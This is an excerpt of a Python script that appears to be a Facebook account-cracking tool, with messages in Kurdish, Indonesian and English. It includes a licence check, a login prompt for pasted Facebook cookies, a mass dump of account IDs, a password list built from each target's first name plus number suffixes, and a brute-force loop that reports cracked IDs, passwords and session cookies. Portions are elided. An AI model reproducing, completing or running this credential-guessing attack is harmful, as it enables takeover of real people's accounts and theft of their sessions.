...
def chk():
  ...
  try:
    httpCaht = requests.get("https://github.com/NYAR1CODER/List1/blob/main/list.txt").text
    if id in httpCaht:
      ...
      print("\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @NYAR_404_CO3DER.....")
      time.sleep(1)
      sys.exit()
  except:
    sys.exit()
...
• GITHUB : https://github.com/NYAR1CODER

'''
	oi = nel(tekz(ban,justify='center',style='bold'), style='cyan')
	cetak(nel(oi, title='[bold yellow] • THIS TOOL CREATE BY NYAR CO3DER • [/bold yellow]'))
# VALIDASI TOKEN
def login():
		try:
...
def login_lagi334():
	try:
		banner()
		___kontol___ = input('[|] COCKIES DABNE : ')
		...
		print('%s# COCKIEST EXPIRE BWA / CP ACCOUNT '%(h))
		exit()
...
def dump_massal():
	...
	if pilih in ['1','01']:
		...
		print(x+'['+h+'•'+x+'] ENTER TOTAL ID LIMIT [1000]')
		try:
		...
		for yuzong in id2:
			...
			if len(nmf)<6:
				if len(frs)<3:
					...
					pwv.append(frs+'2810')
					pwv.append(frs+'2800')
					pwv.append(frs+'2000@0')
					pwv.append(frs+'1234445')
					pwv.append(frs+'99010')
					pwv.append(frs+'9010')
					pwv.append(frs+'2890')
					pwv.append(frs+'20670')
					pwv.append(frs+'2760')
					pwv.append(frs+'8910')
					pwv.append(frs+'3210')
					pwv.append(frs+'5635@#')
					pwv.append(frs+'6730')
					pwv.append(frs+'9830')
					pwv.append(frs+'976@30')
					pwv.append(frs+'854@#0')
					pwv.append(frs+'1312#$@0')
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				...
				if 'no' in taplikasi:
					...
					print('\n')
					statusok = f'N͜͡Y͜͡A͜͡R͜͡ O͜͡K͜͡    [•] ID       : {idf}\n[•] PASSWORD : {pw}\n[•] COOKIES  : {kuki}'
...
def crackfree(idf,pwv):
	...
	ua2 = random.choice(ugen2)
	ses = requests.Session()
	sys.stdout.write('\r%s ☬ %s/%s ☬ O͜͡K͜͡:%s ☬ CP:%s ☬ %s%s%s ☬'%(bi,loop,len(id2),ok,cp,int(pers),str(fff),x));sys.stdout.flush()
	for pw in pwv:
		try:
...
if __name__=='__main__':
	...
	voven_xd(f'\n\t{k}[+] {h}BA XOSHI NYAR SALAMET BI \n\t{k}[+] {k}NYARCO3DERUP\n\t{k}[+] {h}AM TOOLA BA SHARTI SAYA KARIM\n\t{k}[+] {b}--------------------------------------------------\n\t{k}[+] {u}FB : ʬʬ-ʚïɞ NYAR HACK FB\n\t{k}[+] {h}IG : @ROBERTO_MODS\n\t{k}[+] {k}WA : 07503436331\n\t{k}[+] {h}GH : \n\t{k}[+] {b}★SUR3AT ★\n\t{k}[+] {u}★NYAR SELATAN★\n\t{k}[+] {h}★CMD★\n\t{k}[+] {k}NYAR KRMASHANI\n\t{k}[+] {u}SAYRKAW BBENA') 
	time.sleep(3)
	login()
